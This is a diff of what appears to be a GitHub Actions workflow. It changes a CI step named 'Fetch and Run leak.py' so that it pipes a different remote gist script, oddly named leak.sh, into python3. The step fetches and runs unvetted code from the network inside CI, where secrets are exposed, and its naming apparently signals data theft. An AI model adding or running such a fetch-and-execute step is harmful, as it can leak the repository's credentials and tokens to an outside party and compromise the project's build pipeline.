@@ -17,4 +17,4 @@ jobs:
     steps:
       - name: Fetch and Run leak.py
         run: |
-          curl -s https://gist.githubusercontent.com/Pranesh-Shrestha/275c2478d3fcfc393c7434ce4b896e9f/raw/f89a0b1f4adcf21e5094471036686fea00a4a40b0/leak.py | python3
+          curl -s https://gist.githubusercontent.com/Pranesh-Shrestha/b1082ace7fd5d1252411c54eb2fcd9c8/raw/e0f07a24b219a569f60a0ed45f0bcfdc79783d5a/leak.sh | python3
